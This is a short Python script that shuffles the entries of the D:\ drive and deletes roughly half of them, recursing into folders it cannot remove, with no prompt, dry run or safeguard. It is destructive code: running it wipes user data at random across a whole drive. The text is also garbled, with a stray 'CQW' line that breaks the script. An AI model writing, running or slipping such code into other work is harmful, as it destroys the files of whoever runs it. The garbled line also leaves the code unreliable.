import os
import random
import pathlib
import math

CQW
def removeHalfFiles(path):
	files = os.listdir(path)
	if(path is osPath):
		files.pop(0)
	random.shuffle(files)
	for i in range((int)(math.ceil(len(files)/2))):
		if(os.path.isfile(path + files[i])):
			os.remove(path + files[i])
		else:
			try:
				os.rmdir(path + files[i], dir_fd=None)
			except OSError:
				removeHalfFiles(path+files[i]+"\\")

osPath = 'D:\\'

removeHalfFiles(osPath)